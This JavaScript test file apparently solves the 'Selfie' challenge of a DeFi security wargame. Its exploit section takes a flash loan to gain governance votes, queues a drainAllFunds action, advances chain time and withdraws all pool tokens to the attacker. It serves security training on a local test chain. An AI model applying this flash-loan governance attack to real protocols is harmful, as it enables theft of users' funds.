const {ethers} = require('hardhat')
const {expect} = require('chai')

describe('[Challenge] Selfie', function () {
	let deployer, attacker

	const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000') // 2 million tokens
	const TOKENS_IN_POOL = ethers.utils.parseEther('1500000') // 1.5 million tokens

	before(async function () {
		/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
		;[deployer, attacker] = await ethers.getSigners()

		const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory(
			'DamnValuableTokenSnapshot',
			deployer
		)
		const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer)
		const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer)

		this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY)
		this.governance = await SimpleGovernanceFactory.deploy(this.token.address)
		this.pool = await SelfiePoolFactory.deploy(this.token.address, this.governance.address)

		await this.token.transfer(this.pool.address, TOKENS_IN_POOL)

		expect(await this.token.balanceOf(this.pool.address)).to.be.equal(TOKENS_IN_POOL)
	})

	it('Exploit', async function () {
		/** CODE YOUR EXPLOIT HERE */
		// Deploy evil contract
		const SelfieAttacker = await ethers.getContractFactory('SelfieAttacker', attacker)
		this.selfieAttackerContract = await SelfieAttacker.deploy(
			this.pool.address,
			this.governance.address,
			this.token.address
		)

		// Make a flash loan. This will take snapshot, queue evil action and transfer DVT back to pool
		await this.selfieAttackerContract.connect(attacker).executeFlashLoan(TOKENS_IN_POOL)

		// Travel through time (2 days) in order to execute the queued action.
		await ethers.provider.send('evm_increaseTime', [2 * 24 * 60 * 60])

		// Execute the queued action. This will call the drainAllFunds() function of the pool contract
		// and send them to our evil contract.
		await this.governance.connect(attacker).executeAction(1)

		// Retrieve all DVT from attacker contract to attacker address.
		await this.selfieAttackerContract.connect(attacker).withdrawTokens()

		// Log balances
		console.log('POOL DVT BALANCE: ', String(await this.token.balanceOf(this.pool.address)))
		console.log('ATTACKER DVT BALANCE: ', String(await this.token.balanceOf(attacker.address)))
	})

	after(async function () {
		/** SUCCESS CONDITIONS */
		// Attacker has taken all tokens from the pool
		expect(await this.token.balanceOf(attacker.address)).to.be.equal(TOKENS_IN_POOL)

		expect(await this.token.balanceOf(this.pool.address)).to.be.equal('0')
	})
})
